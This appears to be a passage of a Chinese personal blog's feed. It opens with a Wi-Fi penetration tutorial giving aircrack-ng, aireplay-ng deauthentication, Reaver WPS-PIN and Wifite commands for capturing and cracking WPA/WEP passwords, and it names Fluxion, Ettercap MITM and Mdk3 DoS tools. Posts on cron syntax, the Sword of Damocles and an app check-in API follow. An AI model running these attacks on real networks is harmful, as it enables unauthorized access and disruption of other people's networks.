class="line-numbers-rows"><span></span></span></code></pre><ul><li>启动监控模式（假设你的无线网卡是 wlan0），这会启用监控模式，并将网卡重命名为 wlan0mon</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="扫描-Wi-Fi-网络"><a href="#扫描-Wi-Fi-网络" class="headerlink" title="扫描 Wi-Fi 网络"></a>扫描 Wi-Fi 网络</h4><ul><li>使用 airodump-ng 扫描附近的 Wi-Fi 网络，获取网络的 BSSID 和信道等信息<ul><li>BSSID 是目标网络的唯一标识符</li><li>信道（channel）是目标网络运行的频道</li></ul></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="捕获数据包-慢"><a href="#捕获数据包-慢" class="headerlink" title="捕获数据包(慢)"></a>捕获数据包(慢)</h4><ul><li>使用 airodump-ng 对特定网络进行定向扫描，捕获握手，语法如下：<ul><li><BSSID> 是目标网络的 BSSID</li><li><channel> 是目标网络的信道</li><li><output_file> 是你保存数据包的文件名（如：capture）</li></ul></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airodump-ng --bssid <span class="token operator">&lt;</span>BSSID<span class="token operator">></span> -c <span class="token operator">&lt;</span>channel<span class="token operator">></span> -w <span class="token operator">&lt;</span>output_file<span class="token operator">></span> wlan0mon<span class="token comment"># 示例</span><span class="token function">sudo</span> airodump-ng --bssid 00:14:22:01:23:45 -c <span class="token number">6</span> -w capture wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>这会开始抓取数据包，并将其保存到指定文件，在 airodump-ng 的界面上，看到“WPA handshake: <BSSID>”的提示，表示握手已成功捕获，并生成一个 .cap 文件</p></li><li><p>常见问题：wlan0mon is on channel xx, but the AP uses channel xx，信道不一致，要切换到相同的信道</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iwconfig wlan0mon channel xx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="发起攻击捕获数据包-快"><a href="#发起攻击捕获数据包-快" class="headerlink" title="发起攻击捕获数据包(快)"></a>发起攻击捕获数据包(快)</h4><ul><li>通过使用 Aireplay-ng 来进行 deauthentication 攻击，让客户端断开并重新连接，这样可以强制它重新发送握手包<ul><li>–deauth 10：发送 10 个去认证包（deauth）</li><li>-a：指定目标 AP 的 BSSID</li><li>-c：指定客户端的 MAC 地址（可选，如果你知道客户端的 MAC 地址）</li><li>wlan0mon：监控模式的接口</li></ul></li><li>这会使目标客户端断开连接并重新连接，从而捕获握手数据</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> aireplay-ng --deauth <span class="token number">10</span> -a 00:14:22:01:23:45 -c <span class="token operator">&lt;</span>client_mac<span class="token operator">></span> wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="破解-WPA-WPA2-密码"><a href="#破解-WPA-WPA2-密码" class="headerlink" title="破解 WPA/WPA2 密码"></a>破解 WPA/WPA2 密码</h4><ul><li>捕获到 WPA 握手数据后，文件名为 capture-01.cap，并且字典文件（如 rockyou.txt），使用以下命令进行字典攻击<ul><li>capture-01.cap：捕获的握手文件</li><li>-w /path/to/wordlist.txt：指定字典文件的路径</li></ul></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> aircrack-ng capture-01.cap -w /path/to/wordlist.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="破解-WEP-密码"><a href="#破解-WEP-密码" class="headerlink" title="破解 WEP 密码"></a>破解 WEP 密码</h4><ul><li>WEP 网络的破解过程与 WPA/WPA2 略有不同。首先，需要通过 airodump-ng 捕获足够的数据包。然后，使用 aircrack-ng 进行破解。</li><li>aircrack-ng 会自动尝试破解 WEP 密码。如果捕获的数据包足够，它将很快给出密码</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> aircrack-ng capture-01.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="无线网卡退出监听模式"><a href="#无线网卡退出监听模式" class="headerlink" title="无线网卡退出监听模式"></a>无线网卡退出监听模式</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">airmon-ng stop wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Reaver"><a href="#Reaver" class="headerlink" title="Reaver"></a>Reaver</h3><ul><li>专门用于破解 WPS（Wi-Fi Protected Setup） PIN 的工具</li></ul><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> reaver<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="启用监控模式"><a href="#启用监控模式" class="headerlink" title="启用监控模式"></a>启用监控模式</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airmon-ng<span class="token function">sudo</span> airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="扫描目标网络"><a href="#扫描目标网络" class="headerlink" title="扫描目标网络"></a>扫描目标网络</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看支持-WPS-的设备"><a href="#查看支持-WPS-的设备" class="headerlink" title="查看支持 WPS 的设备"></a>查看支持 WPS 的设备</h4><ul><li>MB 是 54e 的可破解，54e 不可破解？</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wash --ignore-fcs -i mon0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用-Reaver-攻击-WPS-PIN"><a href="#使用-Reaver-攻击-WPS-PIN" class="headerlink" title="使用 Reaver 攻击 WPS PIN"></a>使用 Reaver 攻击 WPS PIN</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> reaver -i wlan0mon -b <span class="token operator">&lt;</span>BSSID<span class="token operator">></span> -c <span class="token operator">&lt;</span>channel<span class="token operator">></span> -vv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>其中：<ul><li><BSSID> 是目标网络的 BSSID</li><li><channel> 是目标网络的信道</li><li>-vv 启用详细输出，帮助你查看攻击过程</li></ul></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如：</span><span class="token function">sudo</span> reaver -i wlan0mon -b 00:11:22:33:44:55 -c <span class="token number">6</span> -vv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>如果破解成功，Reaver 会显示正确的 WPS PIN，并通过 WPS PIN 计算出 Wi-Fi 网络的密码</li></ul><h4 id="计算密码"><a href="#计算密码" class="headerlink" title="计算密码"></a>计算密码</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reaver -i mon0 -b <span class="token operator">&lt;</span>mac<span class="token operator">></span> -vv -p <span class="token operator">&lt;</span>PIN<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Wifite"><a href="#Wifite" class="headerlink" title="Wifite"></a>Wifite</h3><ul><li>一个自动化的 Wi-Fi 渗透测试工具，基于 Aircrack-ng 和 Reaver，能够自动化常见的 Wi-Fi 攻击</li></ul><h4 id="安装-Wifite"><a href="#安装-Wifite" class="headerlink" title="安装 Wifite"></a>安装 Wifite</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> wifite<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="使用-Wifite-进行-Wi-Fi-渗透测试"><a href="#使用-Wifite-进行-Wi-Fi-渗透测试" class="headerlink" title="使用 Wifite 进行 Wi-Fi 渗透测试"></a>使用 Wifite 进行 Wi-Fi 渗透测试</h4><ul><li>启用无线网卡的监控模式</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>启动 Wifite，此命令会扫描附近的无线网络并列出所有的网络</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wifite<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="选择攻击目标"><a href="#选择攻击目标" class="headerlink" title="选择攻击目标"></a>选择攻击目标</h4><ul><li>Wifite 会自动列出附近的网络，包含 WPA/WPA2 或 WEP 网络。你可以根据目标网络的 BSSID（网络的唯一标识符）来选择攻击对象</li></ul><h4 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h4><ul><li>一旦你选择了目标网络，Wifite 会开始自动化渗透测试</li></ul><h4 id="字典攻击（针对-WPA-WPA2）"><a href="#字典攻击（针对-WPA-WPA2）" class="headerlink" title="字典攻击（针对 WPA/WPA2）"></a>字典攻击（针对 WPA/WPA2）</h4><ul><li>当 Wifite 捕获到 WPA 握手后，它会尝试使用字典攻击来猜测密码。你可以提供自己的字典文件，也可以使用 Kali 中自带的字典</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wifite -dict /path/to/wordlist.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>常见参数：<ul><li>-h：显示帮助信息。</li><li>-p：仅执行 WEP 密码攻击。</li><li>-w：指定 WPA 密码破解使用的字典文件。</li><li>-c：指定特定的频道进行扫描。</li><li>-p：仅选择 WEP 网络进行攻击。</li></ul></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wifite -p -c <span class="token number">6</span> -dict /usr/share/wordlists/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Fluxion"><a href="#Fluxion" class="headerlink" title="Fluxion"></a>Fluxion</h3><ul><li>功能：它通过社会工程学攻击，诱使用户连接到伪造的接入点（AP），并获取 Wi-Fi 密码。</li><li>用途：创建一个伪造的 Wi-Fi 网络，捕捉目标的 WPA 密码。</li><li>命令示例：fluxion</li></ul><h3 id="Kismet"><a href="#Kismet" class="headerlink" title="Kismet"></a>Kismet</h3><ul><li>功能：是一个无线网络探测工具，可以嗅探和分析 Wi-Fi 网络。</li><li>用途：捕捉、分析并显示周围的所有无线网络。</li><li>命令示例：kismet</li></ul><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h3><ul><li>功能：一个网络嗅探和中间人攻击（MITM）工具，也可以用于 Wi-Fi 网络。</li><li>用途：捕获 Wi-Fi 网络流量，执行中间人攻击来窃取数据。</li><li>命令示例：ettercap -T -q -i wlan0</li></ul><h3 id="Airgeddon"><a href="#Airgeddon" class="headerlink" title="Airgeddon"></a>Airgeddon</h3><ul><li>功能：一个多功能的无线渗透测试工具，它结合了多个攻击技术，如字典攻击、强制嗅探、MITM 攻击等。</li><li>用途：可用于攻击 WPA/WPA2 网络、创建伪造接入点等。</li><li>命令示例：airgeddon</li></ul><h3 id="Eaphammer"><a href="#Eaphammer" class="headerlink" title="Eaphammer"></a>Eaphammer</h3><ul><li>功能：一种专门用于针对企业无线网络（EAPOL 协议）进行攻击的工具。</li><li>用途：对使用 EAP（如 WPA2-Enterprise）保护的网络进行攻击。</li><li>命令示例：eaphammer</li></ul><h3 id="Mdk3"><a href="#Mdk3" class="headerlink" title="Mdk3"></a>Mdk3</h3><ul><li>功能：一个用于攻击 Wi-Fi 网络的工具，支持拒绝服务攻击（DoS）、网络干扰等。</li><li>用途：对 Wi-Fi 网络进行拒绝服务攻击，干扰合法的无线连接。</li><li>命令示例：mdk3 wlan0 d</li></ul><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><ul><li>功能：虽然它不仅限于 Wi-Fi 网络，但 Wireshark 是一款强大的网络协议分析工具，可以用来捕获和分析 Wi-Fi 网络流量。</li><li>用途：抓包并分析无线网络上的数据包。</li><li>命令示例：启动 Wireshark GUI 后，选择无线接口进行捕捉。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;wifi-相关的工具&quot;&gt;&lt;a href=&quot;#wifi-相关的工具&quot; class=&quot;headerlink&quot; title=&quot;wifi 相关的工具&quot;&gt;&lt;/a&gt;wifi 相关的工具&lt;/h2&gt;&lt;h3 id=&quot;Aircrack-ng&quot;&gt;&lt;a href=&quot;#Aircrack-n</summary>
      
    
    
    
    <category term="kali" scheme="http://damao2250.com/categories/kali/"/>
    
    
    <category term="工具" scheme="http://damao2250.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="kali" scheme="http://damao2250.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>cron表达式记录</title>
    <link href="http://damao2250.com/2025/02/12/cron%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%B0%E5%BD%95/"/>
    <id>http://damao2250.com/2025/02/12/cron%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%B0%E5%BD%95/</id>
    <published>2025-02-12T06:14:53.000Z</published>
    <updated>2025-05-09T04:06:36.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a>Cron</h2><ul><li>Cron 表达式是一种用于指定定时任务执行时间的字符串表达式。它由 6 个字段组成，分别表示秒、分钟、小时、天数、月份和星期几。每个字段都可以使用特定的符号来指定时间范围或间隔。</li></ul><pre class="line-numbers language-js" data-language="js"><code class="language-js">┌──────────── <span class="token punctuation">[</span>可选<span class="token punctuation">]</span> <span class="token function">秒</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">|</span> ┌────────── <span class="token function">分钟</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">|</span> <span class="token operator">|</span> ┌──────── <span class="token function">小时</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> ┌────── <span class="token function">天数</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> ┌──── <span class="token function">月份</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token constant">OR</span> jan<span class="token punctuation">,</span>feb<span class="token punctuation">,</span>mar<span class="token punctuation">,</span>apr <span class="token operator">...</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> ┌── <span class="token function">星期几</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">,</span> 星期天 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token constant">OR</span> sun<span class="token punctuation">,</span>mon <span class="token operator">...</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> 命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><ul><li><code>5 8 * * *</code> 每天 8 点 5 分 执行一次</li><li><code>0 0 12 * * *</code> 每天中午 12 点执行</li><li><code>0 0/5 * * * *</code> 每 5 分钟执行一次</li><li><code>0 0 8-18 * * 0-6</code> 周一至周五的 8 点到 18 点之间每小时执行一次</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cron&quot;&gt;&lt;a href=&quot;#Cron&quot; class=&quot;headerlink&quot; title=&quot;Cron&quot;&gt;&lt;/a&gt;Cron&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Cron 表达式是一种用于指定定时任务执行时间的字符串表达式。它由 6 个字段组成，分别表示秒、分钟、小时、天数</summary>
      
    
    
    
    <category term="cron表达" scheme="http://damao2250.com/categories/cron%E8%A1%A8%E8%BE%BE/"/>
    
    
    <category term="cron" scheme="http://damao2250.com/tags/cron/"/>
    
  </entry>
  
  <entry>
    <title>达摩克利斯之剑</title>
    <link href="http://damao2250.com/2025/01/21/%E8%BE%BE%E6%91%A9%E5%85%8B%E5%88%A9%E6%96%AF%E4%B9%8B%E5%89%91/"/>
    <id>http://damao2250.com/2025/01/21/%E8%BE%BE%E6%91%A9%E5%85%8B%E5%88%A9%E6%96%AF%E4%B9%8B%E5%89%91/</id>
    <published>2025-01-21T08:08:23.000Z</published>
    <updated>2025-05-09T04:10:16.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="典故"><a href="#典故" class="headerlink" title="典故"></a>典故</h2><p>达摩克利斯是公元前 4 世纪意大利叙拉古的僭主狄奥尼修二世的朝臣，他非常喜欢奉承狄奥尼修二世。</p><p>他奉承道：作为一个拥有权力和威信的伟人，狄奥尼修二世实在很幸运。</p><p>狄奥尼修二世提议与他交换一天的身份，那他就可以尝试到首领的命运。</p><p>在晚上举行的宴会里，达摩克利斯非常享受成为国王的感觉。</p><p>当晚餐快结束的时候，他抬头才注意到王位上方仅用一根马鬃悬挂着的利剑。</p><p>他立即失去了对美食和美女的兴趣，并请求僭主放过他，他再也不想得到这样的幸运。</p><h2 id="达摩克利斯之剑"><a href="#达摩克利斯之剑" class="headerlink" title="达摩克利斯之剑"></a>达摩克利斯之剑</h2><ul><li>象征着制约，象征着天谴</li><li>象征着一切权与利的终极：神权</li><li>象征着持有者的神位和权能</li></ul><h2 id="寓意"><a href="#寓意" class="headerlink" title="寓意"></a>寓意</h2><ul><li>国王的幸福和安乐都是假象，极大的财富和权力也意味着巨大的责任和危险</li><li>达摩克利斯之剑代表拥有强大的力量的同时承担着相应的责任</li><li>同时我们做任何事都要去看看那把悬在头顶的达摩克利斯之剑，别让那把剑取走了你的性命</li><li>居安思危，警醒自己</li></ul><p><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/20080120-8842A.jpg" alt="达摩克利斯之剑"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;典故&quot;&gt;&lt;a href=&quot;#典故&quot; class=&quot;headerlink&quot; title=&quot;典故&quot;&gt;&lt;/a&gt;典故&lt;/h2&gt;&lt;p&gt;达摩克利斯是公元前 4 世纪意大利叙拉古的僭主狄奥尼修二世的朝臣，他非常喜欢奉承狄奥尼修二世。&lt;/p&gt;
&lt;p&gt;他奉承道：作为一个拥有权力和威</summary>
      
    
    
    
    <category term="碎碎念" scheme="http://damao2250.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="阅读记录" scheme="http://damao2250.com/tags/%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>记录邻里邦自动签到接口</title>
    <link href="http://damao2250.com/2024/12/26/%E8%AE%B0%E5%BD%95%E9%82%BB%E9%87%8C%E9%82%A6%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E6%8E%A5%E5%8F%A3/"/>
    <id>http://damao2250.com/2024/12/26/%E8%AE%B0%E5%BD%95%E9%82%BB%E9%87%8C%E9%82%A6%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%E6%8E%A5%E5%8F%A3/</id>
    <published>2024-12-26T06:23:40.000Z</published>
    <updated>2025-05-09T04:06:36.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="获取验证码"><a href="#获取验证码" class="headerlink" title="获取验证码"></a>获取验证码</h2><ul><li>接口：<a href="https://m-center-prod-linli.timesgroup.cn/times/pub-center/verifycode/api/v1/send">https://m-center-prod-linli.timesgroup.cn/times/pub-center/verifycode/api/v1/send</a></li><li>请求方法：POST</li><li>请求参数<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 只需要修改 phoneNumber 为自己的手机号码</span><span class="token punctuation">&#123;</span><span class="token string">"phoneNumber"</span><span class="token operator">:</span><span class="token string">"1342341234"</span><span class="token punctuation">,</span><span class="token string">"areaCode"</span><span class="token operator">:</span><span class="token string">"86"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>返回结果<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  <span class="token string">"code"</span><span class="token operator">:</span><span class="token number">200</span><span class="token punctuation">,</span>  <span class="token string">"data"</span><span class="token operator">:</span><span class="token string">"验证码发送成功"</span><span class="token punctuation">,</span>  <span class="token string">"message"</span><span class="token operator">:</span><span class="token string">"success"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="根据验证码获取-token"><a href="#根据验证码获取-token" class="headerlink" title="根据验证码获取 token"></a>根据验证码获取 token</h2><ul><li>接口：<a href="https://m-center-prod-linli.timesgroup.cn/times/times-bff/bff/api-c/v1/oauth/token">https://m-center-prod-linli.timesgroup.cn/times/times-bff/bff/api-c/v1/oauth/token</a></li><li>请求方法：POST</li><li>请求参数<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 修改 username 为自己的手机号码</span><span class="token comment">// 修改 password 为收到的验证码</span><span class="token punctuation">&#123;</span>  <span class="token string">"grant_type"</span><span class="token operator">:</span><span class="token string">"sms_code"</span><span class="token punctuation">,</span>  <span class="token string">"scope"</span><span class="token operator">:</span><span class="token string">"all"</span><span class="token punctuation">,</span>  <span class="token string">"client_id"</span><span class="token operator">:</span><span class="token string">"mini_charge"</span><span class="token punctuation">,</span>  <span class="token string">"client_secret"</span><span class="token operator">:</span><span class="token string">"times"</span><span class="token punctuation">,</span>  <span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"13412341234"</span><span class="token punctuation">,</span>  <span class="token string">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">,</span>  <span class="token string">"areaCode"</span><span class="token operator">:</span><span class="token string">"86"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>返回结果<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  <span class="token string">"code"</span><span class="token operator">:</span><span class="token number">200</span><span class="token punctuation">,</span>  <span class="token string">"data"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token string">"authUserDTO"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token string">"expiresIn"</span><span class="token operator">:</span><span class="token number">86399</span><span class="token punctuation">,</span>      <span class="token string">"refreshToken"</span><span class="token operator">:</span><span class="token string">"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"</span><span class="token punctuation">,</span>      <span class="token string">"token"</span><span class="token operator">:</span><span class="token string">"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"</span><span class="token punctuation">,</span>      <span class="token string">"tokenHead"</span><span class="token operator">:</span><span class="token string">"Bearer "</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"userDTO"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token string">"eWechatOpenId"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>      <span class="token string">"eWechatUnionId"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>      <span class="token string">"extUserId"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>      <span class="token string">"id"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>      <span class="token string">"isCancel"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string">"isEnable"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string">"isShowRealName"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string">"isSupplement"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string">"phone"</span><span class="token operator">:</span><span class="token string">"13412341234"</span><span class="token punctuation">,</span>      <span class="token string">"phoneAreaCode"</span><span class="token operator">:</span><span class="token string">"86"</span><span class="token punctuation">,</span>      <span class="token string">"projectId"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>      <span class="token string">"projectName"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>      <span class="token string">"sex"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span>      <span class="token string">"storeType"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>      <span class="token string">"storeUrl"</span><span class="token operator">:</span><span class="token string">"https://mall-prod-app-linli.timesgroup.cn/app/index"</span><span class="token punctuation">,</span>      <span class="token string">"updateTime"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>      <span class="token string">"userImage"</span><span class="token operator">:</span><span class="token string">"https://thirdwx.qlogo.cn/"</span><span class="token punctuation">,</span>      <span class="token string">"userName"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>      <span class="token string">"wxMinipOpenId"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>      <span class="token string">"wxOpenId"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>      <span class="token string">"wxUnionId"</span><span class="token operator">:</span><span class="token string">""</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"userProjectHistoryDTOS"</span><span class="token operator">:</span><span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token string">"projectId"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"projectName"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>        <span class="token string">"storeType"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>        <span class="token string">"storeUrl"</span><span class="token operator">:</span><span class="token string">"https://mall-prod-app-linli.timesgroup.cn/app/index"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token string">"message"</span><span class="token operator">:</span><span class="token string">"success"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="获取会员-id-memberId"><a href="#获取会员-id-memberId" class="headerlink" title="获取会员 id - memberId"></a>获取会员 id - memberId</h2><ul><li>接口：<a href="https://m-center-prod-linli.timesgroup.cn/times/member-bff/member/api-c/v1/member/detailByPhone?phone=13412341234&amp;phoneArea=86">https://m-center-prod-linli.timesgroup.cn/times/member-bff/member/api-c/v1/member/detailByPhone?phone=13412341234&amp;phoneArea=86</a></li><li>请求方法：GET</li><li>请求参数<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 把 url 中的 phone 值替换为自己的手机号码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>请求头加入上一步返回来的 token 拼接在 <code>Bearer </code>后，如下：<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  headers<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    Authorization<span class="token operator">:</span> <span class="token string">"Bearer eyJhbGciOiJSU"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>返回结果，只需要拿到结果中的 memberId<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  <span class="token string">"code"</span><span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token string">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string">"cardNo"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"cardType"</span><span class="token operator">:</span> <span class="token string">"111"</span><span class="token punctuation">,</span>    <span class="token string">"couponNum"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">"createTime"</span><span class="token operator">:</span> <span class="token number">1702007451000</span><span class="token punctuation">,</span>    <span class="token string">"createUser"</span><span class="token operator">:</span> <span class="token number">2</span><span 